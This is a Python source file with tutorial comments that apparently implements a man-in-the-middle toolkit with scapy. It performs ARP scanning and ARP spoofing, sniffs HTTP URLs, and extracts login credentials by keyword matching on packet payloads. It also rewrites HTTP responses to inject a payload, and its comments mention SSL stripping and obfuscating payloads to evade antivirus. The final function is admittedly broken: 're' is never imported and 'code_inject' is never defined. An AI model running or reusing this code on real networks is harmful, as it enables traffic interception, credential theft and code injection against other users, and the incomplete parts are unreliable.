# star(*) means we want to import import everything from scapy.all library
from scapy.all import *
from scapy.layers import http

"""
Scapy is about manipulating networking packets. 
You must have a bit of knowlege about OSI Model and TCP/IP Model to be able to use scapy at its full potential.
"""

# To check if the target IP(s) is/are live or not. If IP(s) is/are up, returns the MAC Address. 
def scan(IP):
	""" 
	Create a source packet with srp(). We use '/' for stacking different Layers of OSI Model.
	In this case, we are stacking (Ether from) Data Link Layer and (ARP from) Network Layer.
	Then we send the packet to broadbast ip address(ff:ff:ff:ff:ff:ff) through Ether(net).
	We stack the ARP Packet to get the MAC Address of the target IP Address.
	The broadcast IP address then asks EVERY SINGLE DEVICE with ARP packet, "Who Has the target IP Address?".
	The one with target IP address replies with ARP packet saying "I have the target IP Address 
	 and my MAC address is this." The broadcast IP address then gives us the MAC of the target.

	dst represents destination and pdst represents packet destination.
	verbose=False to prevent scapy from displaying detailed information.
	timeout=1 means we will wait 1 second for a reply from broadcast

	srp() returns answered and unanswered list. srp()[0] for accessing answered list only
	"""
	ans_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, verbose=False)[0]
	clients_list = []
	for QueryAnswer in ans_list:
		"""
		psrc for packet source and hwsrc for MAC Address source.
		QueryAnswer has both query and answer.
		QueryAnswer[1] because index 0 is our query and index 1 is the answer.
		"""
		client_dict = {'IP' : QueryAnswer[1].psrc, 'MAC' : QueryAnswer[1].hwsrc}
		clients_list.append(client_dict)
	return clients_list

# Get the MAC of a specific IP
def get_mac(IP):
	# sr() or srp() returns answered and unanswered lists
	ans_list = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=1, verbose=False)[0]
 	if len(ans_list) > 0:
		return ans_list[0][1].hwsrc
	else:
		print(f"Waiting for MAC of {IP} ...")
		time.sleep(1)
		return get_mac(IP)

# Return the IP of a known MAC inside the network
def get_ip(network, MAC):
	clients_list = scan(network)
	for client in clients_list:
		if MAC == client['MAC']:
			return client['IP']

"""
We spoof as spoofed_ip and replies the target_ip that spoofed_ip has our MAC Address.
we don't need to specifically set hwsrc to our MAC address as it is done automatically.
"""
def spoof(target_ip, spoofed_ip):
	target_mac = get_mac(target_ip)
	"""
	op=2 means ARP reply. op=1 is ARP request and 1 is the default value.
	hwdst means MAC Address Destination.
	"""
	pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip)

	# Send the Packet
	send(pkt, verbose=False)

"""
We reset the IP Table back to normal, otherwise the router will still think that
the spoofed_ip has our mac. IP Table is a table where IP maps to a MAC
"""
def restore(target_ip, spoofed_ip):
	target_mac = get_mac(target_ip)
	spoofed_mac = get_mac(spoofed_ip)
	pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
	send(pkt, count=4, verbose=False)

# Get the http url from packets
def get_url(pkt):
	# Check if the packet has a HTTP Layer
	if pkt.haslayer(http.HTTPRequest):
		# Return the http url which is made up of host and path
		return pkt[http.HTTPRequest].Host + pkt[http.HTTPRequest].Path

"""
We get the user credentials in plain text. It works in "http" ONLY.
In case of https, it doesnot. Still there's another way to get credentials from https.
Here's how it works:
We force the website to downgrade from https to http. It's like saying the website that
our browser doesnot support https, so please use http for communication.

Don't get your hopes high as it won't work against facebook, google, etc as they have 
several ways to prevent it.
"""
def get_login_info(pkt):
	# Raw Layer is where you get the data
	if pkt.haslayer(Raw):
		load = pkt['Raw'].load
		# we search for similar keywords as different website use different keywords
		keywords = ['username', 'user', 'login', 'password', 'pass']
		for keyword in keywords:
			if keyword.encode() in load:
				return load

# Modify the data (load)
def set_load(pkt, load):
	pkt[Raw].load = load
	"""
	We delete these staffs because different load has different lengths and checksum.
	We don't have to manually set the length and checksum as scapy does that for us.
	"""
	del pkt[IP].len
	del pkt[IP].chksum
	del pkt[TCP].chksum
	return pkt

"""
This function is probably incomplete. As you can see, I used regex but never imported it.
use "import re" to import regex.
I used the code_inject variable but never declared it.

The function updates the content length of the load after a new payload has been injected
"""
def modify_content_length(load):
	# we use regex to search for content length inside
	content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)

	"""
	We check if the load is a text or not. To get a better understanding of text/html, 
	you can use burpsuit or wireshirk to see how different datas are sent
	"""
	if content_length_search and "text/html" in load:
		content_length = content_length_search.group(1)
		"""
		code_inject is our payload. Payload is the main staff in hacking.
		Payload is basically a piece of code that does malicious staffs.
		Payloads are often detected and removed by antivirus, 
		so obfuscation of payload is done to confuse the antivirus.

		After injecting the code, we update the content length. CL is the length 
		of the content that changes according to the payload that you injected.
		"""
		new_content_length = int(content_length) + len(code_inject)
		load = load.replace(content_length, str(new_content_length))
	return load
